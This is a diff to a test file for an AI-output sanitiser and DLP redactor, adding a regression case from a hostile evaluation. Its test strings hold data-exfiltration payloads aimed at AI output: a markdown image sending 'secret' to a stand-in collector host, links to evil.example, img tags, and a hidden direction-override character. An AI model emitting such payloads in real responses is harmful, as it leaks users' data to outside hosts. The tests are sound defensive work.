@@ -133,6 +133,9 @@ describe('REQ-AI-004 / REQ-AI-006 — output validation, sanitising and DLP', ()
     const s = sanitizeAiText('Status ok ![x](https://collector.external.example/p?d=secret) see [here](https://evil.example) <img src=x> ‮approve​');
     expect(s.text).not.toMatch(/collector|evil\.example|<img|‮|​/);
     expect(s.removed).toEqual(expect.arrayContaining(['markdown_image', 'external_link', 'html_tag', 'control_char']));
+    // regression (found by the AT-17 hostile evaluation): a URL inside a tag attribute must not hide the tag
+    const t = sanitizeAiText('see dashboard <img src="https://collector.external.example/i.png"> and <a href=https://x.example');
+    expect(t.text).not.toMatch(/<|>|img|collector|x\.example/);
   });
   it('redacts e-mail, IBAN, national-id and phone patterns', () => {
     const r = redactSensitive('mail advisor@external.example iban SA0380000000608010167519 id 1012345678 phone +966501234567');
